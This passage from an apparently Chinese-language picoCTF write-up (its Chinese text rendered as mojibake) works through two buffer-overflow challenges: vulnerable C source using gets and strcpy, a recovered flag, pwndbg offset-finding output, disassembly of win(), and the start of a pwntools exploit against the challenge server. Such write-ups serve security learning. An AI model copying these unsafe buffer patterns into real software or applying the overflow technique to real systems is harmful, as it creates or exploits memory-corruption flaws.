  <span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// é€™è£¡æ˜¯é—œéµã€‚å‡½æ•¸çš„åç¨±vulnä»£è¡¨è‘—vulnerability</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  FILE <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span> <span class="token string">"Please create 'flag.txt' in this directory with your"</span><span class="token punctuation">,</span>
           <span class="token string">"own debugging flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> FLAGSIZE_MAX<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">signal</span><span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">,</span> sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Set up signal handler ç•¶é‹è¡Œæ™‚å‡ºç¾Signal: SIGSEGV (Segmentation fault)æ™‚æœƒèª¿ç”¨sigsegv_handlerå‡½æ•¸</span>

  <span class="token class-name">gid_t</span> gid <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> gid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The program will exit now\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åˆ†æä»£ç¢¼</strong></p><ol><li>Winning condition æ˜¯è¦è§¸ç™¼ Segmentation faultã€‚</li><li><code>vuln</code>å‡½å¼è£¡é¢çš„ <code>buf2</code>å®£å‘Šç‚º 16 å€‹å­—å…ƒçš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯ 16 å€‹ Bytesã€‚</li><li>ç•¶ <code>gets</code>è¼¸å…¥çš„å…§å®¹è¶…é 16 å€‹ Bytes çš„æ™‚å€™ï¼Œè§¸ç™¼éŒ¯èª¤ã€‚</li></ol><p>é€™é‚Šæˆ‘å€‘å¯ä»¥å†ä¾†çœ‹ä¸€ä¸‹é™¤äº† <code>gets</code>ä»¥å¤–çš„å±éšªå‡½å¼ï¼Œä¹Ÿå°±æ˜¯ <code>strcpy</code>ã€‚ï¼ˆ<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy">Buffer Overflow example - strcpy</a>ï¼‰</p><p>man æ‰‹å†Šè£¡é¢ä¹Ÿå¯«äº†ï¼ŒProgrammerè¦è² èµ·è²¬ä»»ï¼ŒæŒ‡æ´¾ä¸€å€‹è¶³å¤ å¤§çš„ç©ºé–“çµ¦ strcpy çš„ dstï¼ˆDestinationï¼‰ã€‚</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240702145932067.png" alt="Manual page for strcpy"></p><p><strong>BOF æ”»æ“Š</strong></p><p>æ‰€ä»¥æˆ‘å€‘çŸ¥é“ï¼Œåœ¨é€™è£¡åªè¦è¼¸å…¥å¾ˆé•·çš„å­—ä¸²ï¼Œå°±æœƒé€ æˆ <code>strcpy</code>å‡ºéŒ¯ï¼Œä¸¦å¾—åˆ° flagï¼Œé‚£å°±ä¾†è©¦è©¦çœ‹å§ï¼</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240702150413588.png" alt="Flag"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;ov3rfl0ws_ar3nt_that_bad_9f2364bc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="buffer-overflow-1">buffer overflow 1</h1><p>è€æ¨£å­ï¼Œä¸€å€‹ ELF æª”æ¡ˆï¼Œä¸€å€‹æºç¢¼ã€‚å…ˆçœ‹ä¸€ä¸‹ä»£ç¢¼ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"asm.h"</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZE</span> <span class="token expression"><span class="token number">32</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FLAGSIZE</span> <span class="token expression"><span class="token number">64</span></span></span>

<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span>FLAGSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span> <span class="token string">"Please create 'flag.txt' in this directory with your"</span><span class="token punctuation">,</span>
           <span class="token string">"own debugging flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> FLAGSIZE<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Okay, time to return... Fingers Crossed... Jumping to 0x%x\n"</span><span class="token punctuation">,</span> <span class="token function">get_return_address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">gid_t</span> gid <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> gid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter your string: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹èµ·ä¾†æ˜¯å€‹ ret2win çš„é¡Œç›®ï¼Œé‚£å°±ç›´æ¥é–‹å§‹å§ã€‚å…ˆç”¨ gdb æ‰¾ä¸€ä¸‹ offsetã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic <span class="token number">200</span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg<span class="token operator">></span> r
Starting program: /home/kali/picoCTF/vuln.1
<span class="token punctuation">[</span>Thread debugging using libthread_db enabled<span class="token punctuation">]</span>
Using <span class="token function">host</span> libthread_db library <span class="token string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="token builtin class-name">.</span>
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Okay, <span class="token function">time</span> to return<span class="token punctuation">..</span>. Fingers Crossed<span class="token punctuation">..</span>. Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> REGISTERS / show-flags off / show-compact-regs off <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
*EAX  0x41
*EBX  0x6161616a <span class="token punctuation">(</span><span class="token string">'jaaa'</span><span class="token punctuation">)</span>
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb80 <span class="token punctuation">(</span>_rtld_global_ro<span class="token punctuation">)</span> â—‚â€” 0x0
*ESI  0x8049350 <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> â—‚â€” endbr32
*EBP  0x6161616b <span class="token punctuation">(</span><span class="token string">'kaaa'</span><span class="token punctuation">)</span>
*ESP  0xffffcfb0 â—‚â€” <span class="token string">'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
*EIP  0x6161616c <span class="token punctuation">(</span><span class="token string">'laaa'</span><span class="token punctuation">)</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> DISASM / i386 / <span class="token builtin class-name">set</span> emulate on <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Invalid address 0x6161616c










â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ esp 0xffffcfb0 â—‚â€” <span class="token string">'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
01:0004â”‚     0xffffcfb4 â—‚â€” <span class="token string">'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
02:0008â”‚     0xffffcfb8 â—‚â€” <span class="token string">'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
03:000câ”‚     0xffffcfbc â—‚â€” <span class="token string">'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
04:0010â”‚     0xffffcfc0 â—‚â€” <span class="token string">'qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
05:0014â”‚     0xffffcfc4 â—‚â€” <span class="token string">'raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
06:0018â”‚     0xffffcfc8 â—‚â€” <span class="token string">'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
07:001câ”‚     0xffffcfcc â—‚â€” <span class="token string">'taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º <span class="token number">0</span> 0x6161616c
   <span class="token number">1</span> 0x6161616d
   <span class="token number">2</span> 0x6161616e
   <span class="token number">3</span> 0x6161616f
   <span class="token number">4</span> 0x61616170
   <span class="token number">5</span> 0x61616171
   <span class="token number">6</span> 0x61616172
   <span class="token number">7</span> 0x61616173
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg<span class="token operator">></span> cyclic <span class="token parameter variable">-l</span> laaa
Finding cyclic pattern of <span class="token number">4</span> bytes: b<span class="token string">'laaa'</span> <span class="token punctuation">(</span>hex: 0x6c616161<span class="token punctuation">)</span>
Found at offset <span class="token number">44</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾åˆ°ä»–çš„ offset ç‚º 44 å¾Œå†çœ‹ä¸€ä¸‹ <code>win()</code>çš„åœ°å€ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> disass win
Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> win:
   0x080491f6 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>></span>:     endbr32
   0x080491fa <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>></span>:     push   ebp
   0x080491fb <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">5</span>></span>:     mov    ebp,esp
   0x080491fd <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">7</span>></span>:     push   ebx
   0x080491fe <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">8</span>></span>:     sub    esp,0x54
   0x08049201 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">1</span>></span>:    call   0x8049130 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>
   0x08049206 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">6</span>></span>:    <span class="token function">add</span>    ebx,0x2dfa
   0x0804920c <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">2</span>></span>:    sub    esp,0x8
   0x0804920f <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">5</span>></span>:    lea    eax,<span class="token punctuation">[</span>ebx-0x1ff8<span class="token punctuation">]</span>
   0x08049215 <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">1</span>></span>:    push   eax
   0x08049216 <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">2</span>></span>:    lea    eax,<span class="token punctuation">[</span>ebx-0x1ff6<span class="token punctuation">]</span>
   0x0804921c <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">8</span>></span>:    push   eax
   0x0804921d <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">9</span>></span>:    call   0x80490c0 <span class="token operator">&lt;</span>fopen@plt<span class="token operator">></span>
   0x08049222 <span class="token operator">&lt;</span>+4<span class="token operator"><span class="token file-descriptor important">4</span>></span>:    <span class="token function">add</span>    esp,0x10
   0x08049225 <span class="token operator">&lt;</span>+4<span class="token operator"><span class="token file-descriptor important">7</span>></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax
   0x08049228 <span class="token operator">&lt;</span>+5<span class="token operator"><span class="token file-descriptor important">0</span>></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,0x0
   0x0804922c <span class="token operator">&lt;</span>+5<span class="token operator"><span class="token file-descriptor important">4</span>></span>:    jne    0x8049258 <span class="token operator">&lt;</span>win+9<span class="token operator"><span class="token file-descriptor important">8</span>></span>
   0x0804922e <span class="token operator">&lt;</span>+5<span class="token operator"><span class="token file-descriptor important">6</span>></span>:    sub    esp,0x4
   0x08049231 <span class="token operator">&lt;</span>+5<span class="token operator"><span class="token file-descriptor important">9</span>></span>:    lea    eax,<span class="token punctuation">[</span>ebx-0x1fed<span class="token punctuation">]</span>
   0x08049237 <span class="token operator">&lt;</span>+6<span class="token operator"><span class="token file-descriptor important">5</span>></span>:    push   eax
   0x08049238 <span class="token operator">&lt;</span>+6<span class="token operator"><span class="token file-descriptor important">6</span>></span>:    lea    eax,<span class="token punctuation">[</span>ebx-0x1fd8<span class="token punctuation">]</span>
   0x0804923e <span class="token operator">&lt;</span>+7<span class="token operator"><span class="token file-descriptor important">2</span>></span>:    push   eax
   0x0804923f <span class="token operator">&lt;</span>+7<span class="token operator"><span class="token file-descriptor important">3</span>></span>:    lea    eax,<span class="token punctuation">[</span>ebx-0x1fa3<span class="token punctuation">]</span>
   0x08049245 <span class="token operator">&lt;</span>+7<span class="token operator"><span class="token file-descriptor important">9</span>></span>:    push   eax
   0x08049246 <span class="token operator">&lt;</span>+8<span class="token operator"><span class="token file-descriptor important">0</span>></span>:    call   0x8049040 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
   0x0804924b <span class="token operator">&lt;</span>+8<span class="token operator"><span class="token file-descriptor important">5</span>></span>:    <span class="token function">add</span>    esp,0x10
   0x0804924e <span class="token operator">&lt;</span>+8<span class="token operator"><span class="token file-descriptor important">8</span>></span>:    sub    esp,0xc
   0x08049251 <span class="token operator">&lt;</span>+9<span class="token operator"><span class="token file-descriptor important">1</span>></span>:    push   0x0
   0x08049253 <span class="token operator">&lt;</span>+9<span class="token operator"><span class="token file-descriptor important">3</span>></span>:    call   0x8049090 <span class="token operator">&lt;</span>exit@plt<span class="token operator">></span>
   0x08049258 <span class="token operator">&lt;</span>+9<span class="token operator"><span class="token file-descriptor important">8</span>></span>:    sub    esp,0x4
   0x0804925b <span class="token operator">&lt;</span>+10<span class="token operator"><span class="token file-descriptor important">1</span>></span>:   push   DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>
   0x0804925e <span class="token operator">&lt;</span>+10<span class="token operator"><span class="token file-descriptor important">4</span>></span>:   push   0x40
   0x08049260 <span class="token operator">&lt;</span>+10<span class="token operator"><span class="token file-descriptor important">6</span>></span>:   lea    eax,<span class="token punctuation">[</span>ebp-0x4c<span class="token punctuation">]</span>
   0x08049263 <span class="token operator">&lt;</span>+10<span class="token operator"><span class="token file-descriptor important">9</span>></span>:   push   eax
   0x08049264 <span class="token operator">&lt;</span>+11<span class="token operator"><span class="token file-descriptor important">0</span>></span>:   call   0x8049060 <span class="token operator">&lt;</span>fgets@plt<span class="token operator">></span>
   0x08049269 <span class="token operator">&lt;</span>+11<span class="token operator"><span class="token file-descriptor important">5</span>></span>:   <span class="token function">add</span>    esp,0x10
   0x0804926c <span class="token operator">&lt;</span>+11<span class="token operator"><span class="token file-descriptor important">8</span>></span>:   sub    esp,0xc
   0x0804926f <span class="token operator">&lt;</span>+12<span class="token operator"><span class="token file-descriptor important">1</span>></span>:   lea    eax,<span class="token punctuation">[</span>ebp-0x4c<span class="token punctuation">]</span>
   0x08049272 <span class="token operator">&lt;</span>+12<span class="token operator"><span class="token file-descriptor important">4</span>></span>:   push   eax
   0x08049273 <span class="token operator">&lt;</span>+12<span class="token operator"><span class="token file-descriptor important">5</span>></span>:   call   0x8049040 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
   0x08049278 <span class="token operator">&lt;</span>+13<span class="token operator"><span class="token file-descriptor important">0</span>></span>:   <span class="token function">add</span>    esp,0x10
   0x0804927b <span class="token operator">&lt;</span>+13<span class="token operator"><span class="token file-descriptor important">3</span>></span>:   nop
   0x0804927c <span class="token operator">&lt;</span>+13<span class="token operator"><span class="token file-descriptor important">4</span>></span>:   mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>
   0x0804927f <span class="token operator">&lt;</span>+13<span class="token operator"><span class="token file-descriptor important">7</span>></span>:   leave
   0x08049280 <span class="token operator">&lt;</span>+13<span class="token operator"><span class="token file-descriptor important">8</span>></span>:   ret
End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾åˆ°äº†å®ƒçš„åœ°å€æ˜¯ <code>0x080491f6</code>ã€‚é‚£å°±é–‹å§‹æ§‹é€  Exploit å§ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"saturn.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">64447</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b""</span>
offset <span class="token operator">=</span> <span class="token number">44</span>
